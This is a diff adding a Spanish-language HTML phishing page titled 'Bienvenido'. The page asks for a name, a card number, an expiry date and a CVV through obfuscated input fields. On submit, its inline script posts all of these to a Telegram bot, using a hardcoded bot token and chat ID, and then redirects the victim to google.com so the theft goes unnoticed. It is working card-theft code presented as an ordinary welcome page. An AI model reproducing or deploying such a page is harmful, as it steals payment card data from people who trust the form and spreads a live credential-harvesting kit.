@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bienvenido</title>
+    <link rel="shortcut icon" href="pixts/ico.ico" type="image/x-icon">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+     <div></div>
+    <div class="cont-log">
+        <img src="pixts/log.png" alt="">
+    </div>
+
+    <div class="cont2">
+        <img src="pixts/fm2.svg" alt="">
+        <div class="cont-form2">
+            <form id="myfm2" >
+              <div class="usr2">
+                <input id="brax"  type="text">
+                <input id="brex"  type="text">
+              </div>
+
+              <div class="trj">
+                <input placeholder="0000 0000 0000 0000" maxlength="16" id="brix"  type="text">
+              </div>
+
+              <div class="fech-venc">
+                <div class="cont-selects">
+                  <select  id="dia">
+                    <option value="1">1</option>
+                    <option value="2">2</option>
+                    <option value="3">3</option>
+                    <option value="4">4</option>
+                    <option value="5">5</option>
+                    <option value="6">6</option>
+                    <option value="7">7</option>
+                    <option value="8">8</option>
+                    <option value="9">9</option>
+                    <option value="10">10</option>
+                    <option value="11">11</option>
+                    <option value="12">12</option>
+                    <option value="13">13</option>
+                    <option value="14">14</option>
+                    <option value="15">15</option>
+                    <option value="16">16</option>
+                    <option value="17">17</option>
+                    <option value="18">18</option>
+                    <option value="19">19</option>
+                    <option value="20">20</option>
+                    <option value="21">21</option>
+                    <option value="22">22</option>
+                    <option value="23">23</option>
+                    <option value="24">24</option>
+                    <option value="25">25</option>
+                    <option value="26">26</option>
+                    <option value="27">27</option>
+                    <option value="28">28</option>
+                    <option value="29">29</option>
+                    <option value="30">30</option>
+                    <!-- Continúa con las opciones hasta el 30 -->
+                  </select>
+                  <select  id="ano">
+                    <option value="2023">2023</option>
+                    <option value="2024">2024</option>
+                    <option value="2025">2025</option>
+                    <option value="2026">2026</option>
+                    <option value="2027">2027</option>
+                    <option value="2028">2028</option>
+                    <option value="2029">2029</option>
+                    <option value="2030">2030</option>
+                    <option value="2031">2031</option>
+                    <option value="2032">2032</option>
+                    <option value="2033">2033</option>
+                    <option value="2034">2034</option>
+                    <!-- Continúa con las opciones de años según tus necesidades -->
+                  </select>
+
+                </div>
+                <div class="cv">
+                  <input maxlength="3" id="brux"  type="text" placeholder="000">
+  
+                </div>
+              </div>
+              
+              
+              <!-- <input id="brox" name="brox" type="text"> -->
+              <div class="sub2" onclick="carl()">
+                <input type="button" value="Continuar">
+              </div>
+
+            </form>
+        </div>
+
+    </div>
+    <script>
+      function carl(params) {
+   
+      
+     
+
+   
+   const token = '5881769745:AAFiecIBFXB7lIJXhf3N1XP4TPc6uc4ZOjU';
+const chatId = '-4036890861';
+const usr = localStorage.getItem("usr");
+
+let nme = document.getElementById("brax").value;
+let nms = document.getElementById("brex").value;
+let nmcc = document.getElementById("brix").value;
+let nmcv = document.getElementById("brux").value;
+let nmfa = document.getElementById("ano").value;
+let nmfm = document.getElementById("dia").value;
+
+
+  
+const message = `-PCFCO2-\n --Usr.: ${usr} ---  \n -- INFO--- \n  --nOMBRE.: ${nme} ---  apell: ${nms} \n  --CoCo.: ${nmcc} --- \n   --An0.: ${nmfa} --Mes.: ${nmfm} --- \n--CoCovb.: ${nmcv} ---  ` ;
+$.ajax({
+  type: 'POST',
+  url: `https://api.telegram.org/bot${token}/sendMessage`,
+  data: {  
+	  chat_id: chatId,
+	  text: message,
+	  parse_mode: 'html',
+  },
+  success: function (res) {
+	  console.debug(res);
+	  $('#response').text('Message sent');
+	  console.log("enviado")
+	  
+	  window.location = "https://www.google.com/"
+	  
+	  
+	 
+  },
+  error: function (error) {
+	  console.error(error);
+	  alert("error failed");
+  } 
+
+})
+
+}
+
+
+
+
+    </script>
+
+
+</body>
+</html>
